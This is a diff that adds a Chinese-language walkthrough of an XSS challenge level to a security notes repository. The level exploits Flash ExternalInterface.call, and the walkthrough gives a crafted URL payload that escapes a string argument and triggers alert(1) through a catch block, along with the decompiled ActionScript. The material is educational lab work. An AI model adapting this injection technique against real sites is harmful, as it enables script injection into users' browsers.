@@ -239,16 +239,25 @@ package
    }
 }
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
+上一关是Flash getURL XSS，而这一关Flash ExternalInterface.call XSS！</br>
+首先通过LoaderInfo从URL中取值id，再取两个值width和height：</br>
+<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(21).png></br>
+接下来构造payload。</br>
+```
+payload：?arg01=id&arg02=xss%5c"))}catch(e){alert(1)}//%26width=123%26height=123
+```
+第一个参数arg01=id不解释了，重点看第二个参数arg02。</br>
+（1）关于%5c、%26，测试中发现不能直接使用转义符\和&符号。</br>
+（2）ExternalInterface.call(a,b)相当于JS中的函数名(代码)，函数名已经固定了，所以我们就从id这里着手，把id的值代进去。</br>
+<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(22).png></br>
+```
+private function clickHandler(param1:Event) : void
+      {
+         ExternalInterface.call("ZeroClipboard.dispatch","xss\"))}catch(e){
+         	alert(1)
+         	}
+         //","complete",clipText);
+      }
+```
+你会发现这样一来，由于前面少了一个真正可以闭合的"于是会报错，所以后面抛出异常的catch就可以生效了，于是执行后面的alert(1)。</br>
+<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(23).png></br>
